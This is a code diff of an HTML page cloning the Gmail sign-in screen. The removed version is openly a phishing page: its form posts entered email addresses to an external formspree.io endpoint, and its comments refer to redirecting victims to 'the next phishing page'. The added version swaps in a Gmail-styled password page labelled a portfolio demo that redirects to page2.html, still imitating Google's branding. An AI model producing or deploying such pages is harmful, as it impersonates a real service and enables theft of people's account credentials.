@@ -1,17 +1,11 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Gmail - Sign in</title>
-
-  <!-- Optional: modern font (safe fallback to system fonts) -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-
+  <title>Gmail Login - Email</title>
   <style>
-    :root{
+    :root {
       --bg: #f1f5fb;
       --card: #ffffff;
       --text: #1f1f1f;
@@ -26,298 +20,107 @@
       --radius: 18px;
     }
 
-    *{ box-sizing: border-box; }
-    html, body { height: 100%; }
-    body{
-      margin:0;
-      font-family: Roboto, system-ui, -apple-system, Segoe UI, Arial, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; font-family: Roboto, system-ui, -apple-system, Segoe UI, Arial, sans-serif; background: var(--bg); color: var(--text); }
 
-    a{
-      color: var(--link);
-      text-decoration: none;
-      font-weight: 500;
-    }
-    a:hover{ text-decoration: underline; }
+    a { color: var(--link); text-decoration: none; font-weight: 500; }
+    a:hover { text-decoration: underline; }
 
-    /* Page layout */
-    .page{
-      min-height: 100%;
-      display: flex;
-      flex-direction: column;
-    }
+    .page { min-height: 100%; display: flex; flex-direction: column; }
 
-    .center{
-      flex: 1;
-      display: grid;
-      place-items: center;
-      padding: 48px 16px 24px;
-    }
+    .center { flex: 1; display: grid; place-items: center; padding: 48px 16px 24px; }
 
-    .card{
-      width: min(1040px, 100%);
-      background: var(--card);
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      padding: 44px 48px;
-    }
+    .card { width: min(1040px, 100%); background: var(--card); border-radius: var(--radius); box-shadow: var(--shadow); padding: 44px 48px; }
 
-    .grid{
-      display: grid;
-      grid-template-columns: 1.1fr 1fr;
-      gap: 56px;
-      align-items: start;
-    }
+    .grid { display: grid; grid-template-columns: 1.1fr 1fr; gap: 56px; align-items: start; }
 
-    /* Left column */
-    .brandRow{
-      display:flex;
-      align-items:center;
-      gap: 12px;
-      margin-bottom: 18px;
-    }
+    .brandRow { display: flex; align-items: center; gap: 12px; margin-bottom: 18px; }
+    .mark { width: 28px; height: 28px; border-radius: 50%; background: conic-gradient(#4285f4 0 25%, #34a853 0 50%, #fbbc05 0 75%, #ea4335 0 100%); border: 1px solid rgba(0,0,0,.06); }
+    .brand { font-size: 14px; color: var(--muted); letter-spacing: .18px; user-select: none; }
 
-    .mark{
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      background:
-        conic-gradient(#4285f4 0 25%, #34a853 0 50%, #fbbc05 0 75%, #ea4335 0 100%);
-      border: 1px solid rgba(0,0,0,.06);
-    }
+    h1 { margin: 0 0 10px; font-size: 40px; line-height: 1.1; font-weight: 400; }
 
-    .brand{
-      font-size: 14px;
-      color: var(--muted);
-      letter-spacing: .18px;
-      user-select: none;
-    }
+    .pill { display: inline-flex; align-items: center; gap: 10px; border: 1px solid var(--border); border-radius: 999px; padding: 8px 12px; height: 36px; color: var(--text); background: #fff; font-size: 14px; margin-top: 2px; user-select: none; }
+    .pill .avatar { width: 20px; height: 20px; border-radius: 50%; border: 1px solid var(--border); display: grid; place-items: center; color: var(--muted); font-weight: 500; font-size: 12px; }
+    .pill .chev { width: 0; height: 0; border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 6px solid var(--muted); opacity: .9; margin-left: 2px; }
 
-    h1{
-      margin: 0 0 8px;
-      font-size: 40px;
-      line-height: 1.1;
-      font-weight: 400;
-    }
+    .form { margin-top: 28px; }
 
-    .sub{
-      margin: 0;
-      color: var(--muted);
-      font-size: 16px;
-    }
+    .field { margin-top: 10px; }
 
-    /* Right column */
-    .form{
-      margin-top: 18px;
-    }
+    .input { width: 100%; height: 56px; padding: 0 14px; border: 1px solid var(--border); border-radius: 4px; outline: none; font-size: 16px; background: #fff; transition: border-color .12s ease, box-shadow .12s ease; }
+    .input:focus { border-color: var(--focus); box-shadow: 0 0 0 1px var(--focus); }
 
-    .field{
-      position: relative;
-      margin-top: 18px;
-    }
+    .checkRow { display: flex; align-items: center; gap: 10px; margin-top: 12px; color: var(--text); font-size: 13px; user-select: none; }
+    .checkRow input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--focus); }
 
-    .input{
-      width: 100%;
-      height: 56px;
-      padding: 18px 14px 14px;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      outline: none;
-      font-size: 16px;
-      background: #fff;
-      transition: border-color .12s ease, box-shadow .12s ease;
-    }
-    .input:focus{
-      border-color: var(--focus);
-      box-shadow: 0 0 0 1px var(--focus);
-    }
+    .actions { margin-top: 42px; display: flex; align-items: center; justify-content: flex-end; gap: 18px; }
 
-    /* Floating label */
-    .label{
-      position: absolute;
-      left: 12px;
-      top: 18px;
-      padding: 0 4px;
-      color: var(--muted);
-      font-size: 16px;
-      background: white;
-      pointer-events: none;
-      transition: transform .12s ease, color .12s ease, font-size .12s ease, top .12s ease;
-      transform-origin: left top;
-    }
+    .btnLink { font-size: 14px; font-weight: 500; padding: 10px 6px; border-radius: 6px; }
+    .btnLink:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
 
-    .input:focus + .label,
-    .input:not(:placeholder-shown) + .label{
-      top: 6px;
-      font-size: 12px;
-      color: var(--focus);
-    }
+    .btn { border: none; height: 40px; padding: 0 22px; border-radius: 999px; background: var(--btn); color: white; font-weight: 500; cursor: pointer; transition: background .12s ease, transform .06s ease; }
+    .btn:hover { background: var(--btnHover); }
+    .btn:active { transform: translateY(1px); }
+    .btn:disabled { background: var(--btnDisabled); cursor: not-allowed; }
+    .btn:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
 
-    .helpLink{
-      display: inline-block;
-      margin-top: 10px;
-      font-size: 14px;
-    }
+    .footer { display: flex; justify-content: space-between; align-items: center; gap: 16px; padding: 18px 18px 28px; width: min(1040px, 100%); margin: 0 auto; color: var(--muted); font-size: 12px; }
 
-    .hint{
-      margin: 26px 0 0;
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.45;
-    }
+    .lang { display: flex; align-items: center; gap: 10px; }
+    select { border: 1px solid transparent; background: transparent; color: var(--muted); padding: 6px 10px; border-radius: 8px; cursor: pointer; }
+    select:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }
 
-    .actions{
-      margin-top: 34px;
-      display:flex;
-      align-items:center;
-      justify-content: space-between;
-      gap: 16px;
-    }
+    .footlinks { display: flex; gap: 18px; flex-wrap: wrap; justify-content: flex-end; }
+    .footlinks a { color: var(--muted); font-weight: 400; }
+    .footlinks a:hover { color: var(--text); text-decoration: underline; }
 
-    .btnLink{
-      font-size: 14px;
-      font-weight: 500;
-      padding: 10px 6px;
-      border-radius: 6px;
-    }
-    .btnLink:focus-visible{
-      outline: 2px solid var(--focus);
-      outline-offset: 2px;
-    }
-
-    .btn{
-      border: none;
-      height: 40px;
-      padding: 0 22px;
-      border-radius: 999px;
-      background: var(--btn);
-      color: white;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background .12s ease, transform .06s ease;
-    }
-    .btn:hover{ background: var(--btnHover); }
-    .btn:active{ transform: translateY(1px); }
-    .btn:disabled{
-      background: var(--btnDisabled);
-      cursor: not-allowed;
-    }
-    .btn:focus-visible{
-      outline: 2px solid var(--focus);
-      outline-offset: 2px;
-    }
-
-    /* Footer */
-    .footer{
-      display:flex;
-      justify-content: space-between;
-      align-items:center;
-      gap: 16px;
-      padding: 18px 18px 28px;
-      width: min(1040px, 100%);
-      margin: 0 auto;
-      color: var(--muted);
-      font-size: 12px;
-    }
-
-    .lang{
-      display:flex;
-      align-items:center;
-      gap: 10px;
-    }
-
-    select{
-      border: 1px solid transparent;
-      background: transparent;
-      color: var(--muted);
-      padding: 6px 10px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    select:focus-visible{
-      outline: 2px solid var(--focus);
-      outline-offset: 2px;
-    }
-
-    .footlinks{
-      display:flex;
-      gap: 18px;
-      flex-wrap: wrap;
-      justify-content: flex-end;
-    }
-    .footlinks a{
-      color: var(--muted);
-      font-weight: 400;
-    }
-    .footlinks a:hover{
-      color: var(--text);
-      text-decoration: underline;
-    }
-
-    /* Responsive */
-    @media (max-width: 860px){
-      .card{ padding: 32px 22px; }
-      .grid{
-        grid-template-columns: 1fr;
-        gap: 22px;
-      }
-      h1{ font-size: 34px; }
-      .form{ margin-top: 0; }
-      .footer{
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      .footlinks{
-        justify-content: flex-start;
-      }
+    @media (max-width: 860px) {
+      .card { padding: 32px 22px; }
+      .grid { grid-template-columns: 1fr; gap: 22px; }
+      h1 { font-size: 34px; }
+      .form { margin-top: 6px; }
+      .footer { flex-direction: column; align-items: flex-start; }
+      .footlinks { justify-content: flex-start; }
+      .actions { justify-content: space-between; }
     }
   </style>
 </head>
-
 <body>
   <div class="page">
     <main class="center">
-      <section class="card" aria-label="Sign in card">
+      <section class="card" aria-label="Welcome card">
         <div class="grid">
-          <!-- Left column -->
           <div>
             <div class="brandRow">
               <div class="mark" aria-hidden="true"></div>
               <div class="brand">Gmail</div>
             </div>
-
-            <h1>Sign in</h1>
-            <p class="sub">to continue to Gmail</p>
+            <h1>Welcome</h1>
+            <div class="pill" role="button" tabindex="0" aria-label="Account selector (demo)">
+              <div class="avatar" aria-hidden="true">•</div>
+              <div class="emailText">example@gmail.com</div>
+              <div class="chev" aria-hidden="true"></div>
+            </div>
           </div>
-
-          <!-- Right column -->
           <div class="form">
-            <form id="signinForm" novalidate action="https://formspree.io/f/xnjjqbjl" method="POST">
+            <form id="pwForm" novalidate>
               <div class="field">
                 <input
-                  id="identifier"
+                  id="password"
                   class="input"
-                  type="text"
-                  inputmode="email"
-                  autocomplete="username"
-                  placeholder=" "
-                  aria-describedby="identifierHelp"
+                  type="password"
+                  autocomplete="current-password"
+                  placeholder="Enter your password"
                   required
                 />
-                <label class="label" for="identifier">Email or phone</label>
               </div>
-
-              <a class="helpLink" href="#" id="forgotLink">Forgot email?</a>
-
-              <p class="hint" id="identifierHelp">
-                Not your computer? Use a Private Window to sign in.
-                <a href="#" id="learnMoreLink">Learn more</a>
-              </p>
-
+              <label class="checkRow" for="showPw">
+                <input id="showPw" type="checkbox" />
+                <span>Show password</span>
+              </label>
               <div class="actions">
-                <a class="btnLink" href="#" id="createAccountLink">Create account</a>
+                <a class="btnLink" href="#" id="tryAnotherWay">Try another way</a>
                 <button class="btn" id="nextBtn" type="submit" disabled>Next</button>
               </div>
             </form>
@@ -325,7 +128,6 @@
         </div>
       </section>
     </main>
-
     <footer class="footer" aria-label="Footer">
       <div class="lang">
         <label for="lang" class="sr-only" style="position:absolute;left:-9999px;">Language</label>
@@ -336,7 +138,6 @@
           <option>Français</option>
         </select>
       </div>
-
       <nav class="footlinks" aria-label="Footer links">
         <a href="#" id="helpLink">Help</a>
         <a href="#" id="privacyLink">Privacy</a>
@@ -346,46 +147,45 @@
   </div>
 
   <script>
-    // Store the field value in a variable
-    let fieldValue = "";
-
-    // Switch to the next phishing page
-    function goToNextPage() {
-      // Replace this with the URL of your next phishing page
-      const nextPageUrl = "https://your-github-page-url.com/next-phishing-page.html";
-      window.location.href = nextPageUrl;
-    }
-
-    const input = document.getElementById('identifier');
+    const pw = document.getElementById('password');
+    const showPw = document.getElementById('showPw');
     const nextBtn = document.getElementById('nextBtn');
-    const form = document.getElementById('signinForm');
+    const form = document.getElementById('pwForm');
 
     function syncButtonState() {
-      nextBtn.disabled = input.value.trim().length === 0;
+      nextBtn.disabled = pw.value.trim().length === 0;
     }
 
-    input.addEventListener('input', syncButtonState);
-    input.addEventListener('blur', syncButtonState);
+    pw.addEventListener('input', syncButtonState);
     window.addEventListener('load', syncButtonState);
+
+    showPw.addEventListener('change', () => {
+      pw.type = showPw.checked ? 'text' : 'password';
+      pw.focus();
+    });
 
     form.addEventListener('submit', (e) => {
       e.preventDefault();
-      const value = input.value.trim();
+      const value = pw.value.trim();
       if (!value) return;
 
-      // Store the field value
-      fieldValue = value;
-
-      // Show "Working..." message
       nextBtn.textContent = 'Working...';
       nextBtn.disabled = true;
 
-      // Switch to the next phishing page after a delay
       setTimeout(() => {
         nextBtn.textContent = 'Next';
         syncButtonState();
-        goToNextPage();
+        alert('Demo only — this is a UI recreation for a portfolio (no real sign-in).');
+        window.location.href = 'page2.html'; // Redirect to page 2
       }, 650);
+    });
+
+    ['tryAnotherWay','helpLink','privacyLink','termsLink'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('Demo link (no navigation).');
+      });
     });
   </script>
 </body>
